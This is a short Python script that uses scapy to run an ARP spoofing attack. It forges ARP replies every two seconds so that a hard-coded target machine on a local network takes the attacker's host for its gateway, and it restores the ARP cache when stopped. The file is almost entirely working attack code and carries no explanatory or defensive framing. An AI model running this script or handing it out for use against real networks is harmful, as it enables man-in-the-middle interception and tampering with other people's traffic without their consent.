from scapy.all import *
from scapy.layers.l2 import ARP, Ether
import time
import argparse


class Spoofing:

    def __init__(self):
        #self._parser = argparse.ArgumentParser()
        self._target_ip = '192.168.11.69'
        self._gateway_ip = '192.168.11.115'

    def set_args(self):
        self._parser.add_argument('-t', '--target', dest='_target_ip', required=True, help='Target IP Address/Addresses')
        self._parser.add_argument('-g', '--gateway', dest='_gateway_ip', required=True, help='Gateway IP Address')

    def get_args(self):
        # Parse arguments
        options = self._parser.parse_args()
        self._target_ip = options._target_ip
        self._gateway_ip = options._gateway_ip
        return options

    def set_target_ip(self, target_ip):
        self._target_ip = target_ip

    def set_gateway_ip(self, gateway_ip):
        self._gateway_ip = gateway_ip

    def get_mac(self, ip):
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=7, verbose=False)[0]

        if answered_list:
            return answered_list[0][1].hwsrc
        else:
            print(f"No response for IP: {ip}")
            return None

    def spoof(self):
        target_mac = self.get_mac(self._target_ip)
        if target_mac:
            packet = ARP(op=2, pdst=self._target_ip, hwdst=target_mac, psrc=self._gateway_ip)
            send(packet, verbose=False)
            print(f"Sent ARP reply to {self._target_ip} ({target_mac}): is-at {self._gateway_ip}")

    def restore(self):
        target_mac = self.get_mac(self._target_ip)
        gateway_mac = self.get_mac(self._gateway_ip)
        if target_mac and gateway_mac:
            packet = ARP(op=2, pdst=self._target_ip, hwdst=target_mac, psrc=self._gateway_ip, hwsrc=gateway_mac)
            send(packet, count=4, verbose=False)
            print("Network restored.")


def main():
    spoof = Spoofing()
    #spoof.set_args()
    #options = spoof.get_args()

    try:
        print("Starting ARP spoofing. Press Ctrl+C to stop...")
        while True:
            spoof.spoof()
            time.sleep(2)
    except KeyboardInterrupt:
        print("\nStopping ARP spoofing and restoring network...")
        spoof.restore()


if __name__ == "__main__":
    main()
